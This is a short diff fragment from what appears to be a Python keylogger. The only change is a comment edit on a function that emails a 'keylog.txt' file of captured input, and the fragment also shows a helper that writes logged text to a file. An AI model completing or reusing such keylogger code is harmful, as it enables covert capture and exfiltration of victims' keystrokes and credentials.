@@ -25,7 +25,7 @@ def log(text):
         f.write(str(text))
         f.close()
 
-# Send email with keylog.txt
+# Send email with keylog.txt attached
 def email_log():
     # Set messgae header and body
     msg = MIMEMultipart()
